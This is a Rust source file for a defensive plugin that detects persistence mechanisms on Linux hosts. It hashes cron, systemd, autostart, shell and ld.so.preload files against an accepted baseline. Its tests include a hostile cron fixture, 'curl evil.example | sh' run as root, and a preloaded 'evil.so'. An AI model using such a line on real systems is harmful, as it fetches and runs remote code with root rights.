// SPDX-FileCopyrightText: 2026 Nubian Ibex and IbexWall contributors
// SPDX-License-Identifier: GPL-3.0-or-later

//! `endpoint.persistence`: the places a program uses to stay. Each is
//! hashed; findings are what is new or changed since the person accepted a
//! baseline (a plan, so it is audited and can be rolled back). Without a
//! baseline the check says "not assessed" rather than guessing, except
//! `/etc/ld.so.preload`, which is worth a finding whenever it names
//! libraries: legitimate uses exist, but almost only malware does it.
//!
//! No watcher: the SDK has no monitor interface yet (open since F7), so the
//! check runs on the scheduler. Names of units, files and users are Fluent
//! arguments only.

use std::collections::BTreeMap;

use ibexwall_proto::{
    CheckOutcome, CheckReport, CheckResult, Finding, FindingStatus, Op, Remediation, Severity,
};
use ibexwall_sdk::{Plugin, PluginError, Sandbox};
use serde_json::{Value, json};
use sha2::{Digest, Sha256};

const BASELINE: &str = "/var/lib/ibexwall/persistence/baseline.json";
/// Findings listed; the rest are counted in one more.
const MAX_FINDINGS: usize = 20;

/// The plugin's entry point: the multicall binary calls it, and a plugin runs
/// as its own process (ADR-0041).
pub fn run() {
    let runtime = tokio::runtime::Builder::new_multi_thread()
        .enable_all()
        .build()
        .expect("tokio runtime");
    if let Err(err) = runtime.block_on(ibexwall_sdk::serve(Persistence)) {
        eprintln!("ibexwall-plugin-persistence: {err}");
        std::process::exit(1);
    }
}

struct Persistence;

/// One watched location. `kinds` and `path` are reported as data.
struct Watch {
    dir: &'static str,
    kind: &'static str,
    /// Only files whose name ends with one of these (empty: all files).
    suffixes: &'static [&'static str],
}

const WATCHES: &[Watch] = &[
    Watch {
        dir: "/etc/systemd/system",
        kind: "unit",
        suffixes: &[],
    },
    Watch {
        dir: "/usr/lib/systemd/system",
        kind: "unit",
        suffixes: &[],
    },
    Watch {
        dir: "/etc/cron.d",
        kind: "cron",
        suffixes: &[],
    },
    Watch {
        dir: "/etc/cron.hourly",
        kind: "cron",
        suffixes: &[],
    },
    Watch {
        dir: "/etc/cron.daily",
        kind: "cron",
        suffixes: &[],
    },
    Watch {
        dir: "/etc/cron.weekly",
        kind: "cron",
        suffixes: &[],
    },
    Watch {
        dir: "/etc/cron.monthly",
        kind: "cron",
        suffixes: &[],
    },
    Watch {
        dir: "/var/spool/cron",
        kind: "cron",
        suffixes: &[],
    },
    Watch {
        dir: "/etc/xdg/autostart",
        kind: "autostart",
        suffixes: &[".desktop"],
    },
    Watch {
        dir: "/etc/profile.d",
        kind: "shell",
        suffixes: &[],
    },
];

/// Stand-alone files (present or not) whose content is hashed when present.
const FILES: &[(&str, &str)] = &[
    ("/etc/crontab", "cron"),
    ("/etc/ld.so.preload", "preload"),
    ("/etc/profile", "shell"),
    ("/etc/bash.bashrc", "shell"),
    ("/etc/bashrc", "shell"),
];

fn kind_label(kind: &str) -> &'static str {
    match kind {
        "unit" => "startup entry",
        "cron" => "scheduled task",
        "autostart" => "autostart entry",
        "shell" => "shell start-up file",
        "preload" => "preloaded library entry",
        _ => "entry",
    }
}

/// Everything watched, as `path -> (kind, sha256)`. Unreadable files are
/// listed with their kind and no hash: they are worth looking at, not hidden.
fn inventory(sandbox: &Sandbox) -> BTreeMap<String, (String, String)> {
    let mut out = BTreeMap::new();
    for watch in WATCHES {
        for name in sandbox.list(watch.dir) {
            if !watch.suffixes.is_empty() && !watch.suffixes.iter().any(|s| name.ends_with(s)) {
                continue;
            }
            let path = format!("{}/{}", watch.dir, name);
            if name.ends_with(".wants") || name.ends_with(".requires") {
                // Enablement directories: the unit inside is the fact.
                for inner in sandbox.list(&path) {
                    let inner_path = format!("{path}/{inner}");
                    hash(sandbox, &inner_path, watch.kind, &mut out);
                }
                continue;
            }
            hash(sandbox, &path, watch.kind, &mut out);
        }
    }
    for (path, kind) in FILES {
        if sandbox.exists(path) {
            hash(sandbox, path, kind, &mut out);
        }
    }
    // Each user's autostart and shell start-up files.
    for home in homes(sandbox) {
        for (sub, kind, suffixes) in [
            (".config/autostart", "autostart", &[".desktop"][..]),
            (".config/systemd/user", "unit", &[][..]),
            (".bashrc", "shell", &[][..]),
            (".profile", "shell", &[][..]),
            (".bash_profile", "shell", &[][..]),
        ] {
            let path = format!("{home}/{sub}");
            if sub.starts_with(".config/") {
                for name in sandbox.list(&path) {
                    if suffixes.is_empty() || suffixes.iter().any(|s| name.ends_with(s)) {
                        hash(sandbox, &format!("{path}/{name}"), kind, &mut out);
                    }
                }
            } else if sandbox.exists(&path) {
                hash(sandbox, &path, kind, &mut out);
            }
        }
    }
    out
}

fn homes(sandbox: &Sandbox) -> Vec<String> {
    let mut out = vec!["/root".to_string()];
    for name in sandbox.list("/home") {
        out.push(format!("/home/{name}"));
    }
    out
}

fn hash(sandbox: &Sandbox, path: &str, kind: &str, out: &mut BTreeMap<String, (String, String)>) {
    let digest = sandbox
        .read_bytes(path)
        .map(|bytes| hex::encode(Sha256::digest(&bytes)))
        .unwrap_or_default();
    out.insert(path.to_string(), (kind.to_string(), digest));
}

/// `/etc/ld.so.preload` with at least one library named.
fn preload_names(sandbox: &Sandbox) -> Vec<String> {
    sandbox
        .read("/etc/ld.so.preload")
        .map(|text| {
            text.lines()
                .map(str::trim)
                .filter(|l| !l.is_empty() && !l.starts_with('#'))
                .map(String::from)
                .collect()
        })
        .unwrap_or_default()
}

fn load_baseline(sandbox: &Sandbox) -> Option<BTreeMap<String, (String, String)>> {
    let text = sandbox.read(BASELINE)?;
    serde_json::from_str(&text).ok()
}

impl Plugin for Persistence {
    fn id(&self) -> &'static str {
        "endpoint.persistence"
    }

    async fn check(&self, _config: Value) -> Result<CheckReport, PluginError> {
        Ok(evaluate(&Sandbox::system(), "1970-01-01T00:00:00Z"))
    }

    async fn plan(&self, config: Value) -> Result<Vec<Op>, PluginError> {
        let action = config
            .get("action")
            .and_then(Value::as_str)
            .unwrap_or_default()
            .to_string();
        if action != "baseline" {
            return Err(PluginError::invalid("action", "action is `baseline`"));
        }
        plan_baseline(&Sandbox::system())
    }
}

/// Writes the current inventory down as the baseline the person accepted.
fn plan_baseline(sandbox: &Sandbox) -> Result<Vec<Op>, PluginError> {
    let current = inventory(sandbox);
    let mut map = serde_json::Map::new();
    for (path, (kind, digest)) in &current {
        map.insert(path.clone(), json!([kind, digest]));
    }
    let content = serde_json::to_string(&Value::Object(map))
        .map_err(|e| PluginError::Failed(e.to_string()))?;
    Ok(vec![Op::FileWrite {
        path: BASELINE.into(),
        content: format!("{content}\n"),
        mode: "0644".into(),
        owner: "root".into(),
        group: "root".into(),
    }])
}

fn evaluate(sandbox: &Sandbox, detected_at: &str) -> CheckReport {
    let current = inventory(sandbox);
    let baseline = load_baseline(sandbox);
    let mut findings = Vec::new();
    let mut changes = 0usize;

    let finding = |id: &str,
                   severity,
                   title: &str,
                   summary: &str,
                   kind: &str,
                   path: &str,
                   template: Option<&str>| {
        let mut args = BTreeMap::new();
        args.insert("kind".to_string(), kind_label(kind).to_string());
        args.insert("path".to_string(), path.to_string());
        Finding {
            id: id.into(),
            plugin: "endpoint.persistence".into(),
            severity,
            title_key: title.into(),
            summary_key: summary.into(),
            args,
            references: vec![],
            remediation: template.map(|t| Remediation {
                plan_template: Some(t.into()),
                may_affect_keys: vec!["persistence-may-affect".into()],
            }),
            status: FindingStatus::Open,
            detected_at: detected_at.into(),
        }
    };

    // ld.so.preload: a finding whenever it names libraries, baseline or not.
    for name in preload_names(sandbox) {
        findings.push(finding(
            "persistence.preload",
            Severity::High,
            "persistence-preload-title",
            "persistence-preload-summary",
            "preload",
            &format!("/etc/ld.so.preload: {name}"),
            None,
        ));
    }

    let mut outcome = CheckOutcome::Pass;
    match baseline {
        None => outcome = CheckOutcome::NotAssessed,
        Some(baseline) => {
            let mut by_kind: BTreeMap<String, usize> = BTreeMap::new();
            let mut overflow = BTreeMap::<&str, usize>::new();
            for (path, (kind, digest)) in &current {
                if *kind == "preload" {
                    continue; // reported above, whatever the baseline says
                }
                let before = baseline.get(path);
                let state = match before {
                    None => "new",
                    Some((_, prior)) if prior == digest => continue,
                    Some(_) => "changed",
                };
                changes += 1;
                *by_kind.entry(kind.clone()).or_default() += 1;
                if findings.len() < MAX_FINDINGS {
                    let (id, title, summary) = if state == "new" {
                        (
                            "persistence.new",
                            "persistence-new-title",
                            "persistence-new-summary",
                        )
                    } else {
                        (
                            "persistence.changed",
                            "persistence-changed-title",
                            "persistence-changed-summary",
                        )
                    };
                    findings.push(finding(
                        id,
                        Severity::Medium,
                        title,
                        summary,
                        kind,
                        path,
                        None,
                    ));
                } else {
                    *overflow.entry(kind.as_str()).or_default() += 1;
                }
            }
            for (kind, count) in overflow {
                let mut args = BTreeMap::new();
                args.insert("kind".to_string(), kind_label(kind).to_string());
                args.insert("count".to_string(), count.to_string());
                findings.push(Finding {
                    id: "persistence.more".into(),
                    plugin: "endpoint.persistence".into(),
                    severity: Severity::Medium,
                    title_key: "persistence-more-title".into(),
                    summary_key: "persistence-more-summary".into(),
                    args,
                    references: vec![],
                    remediation: None,
                    status: FindingStatus::Open,
                    detected_at: detected_at.into(),
                });
            }
            if changes > 0 {
                outcome = CheckOutcome::Fail;
            }
        }
    }
    CheckReport {
        results: vec![CheckResult {
            id: "persistence.diff".into(),
            severity: Severity::Medium,
            outcome,
        }],
        findings,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn tree(files: &[(&str, &str)]) -> (std::path::PathBuf, Sandbox) {
        static N: std::sync::atomic::AtomicU32 = std::sync::atomic::AtomicU32::new(0);
        let root = std::env::temp_dir().join(format!(
            "ibx-pers-{}-{}",
            std::process::id(),
            N.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
        ));
        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(&root).unwrap();
        for (path, content) in files {
            let full = root.join(path.trim_start_matches('/'));
            if let Some(parent) = full.parent() {
                std::fs::create_dir_all(parent).unwrap();
            }
            std::fs::write(full, content).unwrap();
        }
        (root.clone(), Sandbox::at(root))
    }

    #[test]
    fn without_a_baseline_nothing_is_claimed() {
        let (root, sandbox) = tree(&[(
            "/etc/cron.d/evil",
            "* * * * * root curl evil.example | sh\n",
        )]);
        let report = evaluate(&sandbox, "now");
        assert_eq!(report.results[0].outcome, CheckOutcome::NotAssessed);
        assert!(report.findings.is_empty(), "{:?} ", report.findings);
        std::fs::remove_dir_all(root).unwrap();
    }

    #[test]
    fn a_preload_entry_is_a_finding_whenever_it_exists() {
        let (root, sandbox) = tree(&[
            ("/etc/ld.so.preload", "# comment\n/usr/local/lib/evil.so\n"),
            ("/var/lib/ibexwall/persistence/baseline.json", "{}"),
        ]);
        let report = evaluate(&sandbox, "now");
        assert_eq!(
            report.results[0].outcome,
            CheckOutcome::Pass,
            "the diff check itself is clean"
        );
        assert_eq!(report.findings.len(), 1);
        assert_eq!(report.findings[0].id, "persistence.preload");
        assert_eq!(report.findings[0].severity, Severity::High);
        assert!(report.findings[0].args["path"].contains("evil.so"));
        std::fs::remove_dir_all(root).unwrap();
    }

    #[test]
    fn new_and_changed_entries_are_found_and_kindled() {
        let (root, sandbox) = tree(&[
            ("/etc/systemd/system/old.timer", "[Timer]\n"),
            ("/etc/cron.d/keep", "0 3 * * * root backup\n"),
            (
                "/var/lib/ibexwall/persistence/baseline.json",
                "{\"/etc/systemd/system/old.timer\": [\"unit\", \"x\"], \"/etc/cron.d/keep\": [\"cron\", \"y\"]}",
            ),
        ]);
        // One new unit, one changed cron, one unchanged timer.
        std::fs::create_dir_all(root.join("etc/systemd/system")).unwrap();
        std::fs::write(root.join("etc/systemd/system/evil.service"), "[Service]\n").unwrap();
        std::fs::write(root.join("etc/cron.d/keep"), "0 4 * * * root backup\n").unwrap();
        let report = evaluate(&sandbox, "now");
        assert_eq!(report.results[0].outcome, CheckOutcome::Fail);
        // BTreeMap order: the changed cron, the new unit, then the timer
        // whose baseline hash does not match (a baseline is only as good as
        // its hashes, so a mismatch is a change).
        let seen: Vec<(&str, &str)> = report
            .findings
            .iter()
            .map(|f| (f.id.as_str(), f.args["path"].as_str()))
            .collect();
        assert_eq!(
            seen,
            [
                ("persistence.changed", "/etc/cron.d/keep"),
                ("persistence.new", "/etc/systemd/system/evil.service"),
                ("persistence.changed", "/etc/systemd/system/old.timer"),
            ]
        );
        assert_eq!(report.findings[1].args["kind"], "startup entry");
        std::fs::remove_dir_all(root).unwrap();
    }

    #[test]
    fn the_baseline_plan_records_every_hash_and_its_rollback_clears_it() {
        let (root, sandbox) = tree(&[
            ("/etc/cron.d/keep", "x\n"),
            (
                "/home/ana/.config/autostart/chat.desktop",
                "[Desktop Entry]\n",
            ),
            ("/home/ana/.bashrc", "alias ls='ls --color'\n"),
        ]);
        let ops = plan_baseline(&sandbox).unwrap();
        assert_eq!(ops.len(), 1);
        let Op::FileWrite { path, content, .. } = &ops[0] else {
            panic!()
        };
        assert_eq!(path, BASELINE);
        for path in [
            "/etc/cron.d/keep",
            "/home/ana/.config/autostart/chat.desktop",
            "/home/ana/.bashrc",
        ] {
            assert!(content.contains(path), "{path}\n{content}");
        }
        assert!(!content.contains("alias ls"), "content, not file text");
        // Written down, the check goes quiet.
        std::fs::create_dir_all(
            root.join(BASELINE.trim_start_matches('/'))
                .parent()
                .unwrap(),
        )
        .unwrap();
        std::fs::write(root.join(BASELINE.trim_start_matches('/')), content).unwrap();
        assert_eq!(
            evaluate(&sandbox, "now").results[0].outcome,
            CheckOutcome::Pass
        );
        std::fs::remove_dir_all(root).unwrap();
    }

    #[test]
    fn a_flood_of_changes_shows_twenty_and_counts_the_rest() {
        let files: Vec<(String, String)> = (0..30)
            .map(|n| (format!("/etc/cron.d/f{n}"), format!("x{n}\n")))
            .collect();
        let refs: Vec<(&str, &str)> = files
            .iter()
            .map(|(p, c)| (p.as_str(), c.as_str()))
            .collect();
        let (root, sandbox) = tree(&[
            ("/var/lib/ibexwall/persistence/baseline.json", "{}"),
            ("/etc/ld.so.preload", ""),
        ]);
        drop(refs);
        for (path, content) in &files {
            std::fs::create_dir_all(root.join(path.trim_start_matches('/')).parent().unwrap())
                .unwrap();
            std::fs::write(root.join(path.trim_start_matches('/')), content).unwrap();
        }
        let report = evaluate(&sandbox, "now");
        assert_eq!(report.findings.len(), MAX_FINDINGS + 1);
        assert_eq!(report.findings.last().unwrap().id, "persistence.more");
        assert_eq!(report.findings.last().unwrap().args["count"], "10");
        std::fs::remove_dir_all(root).unwrap();
    }
}
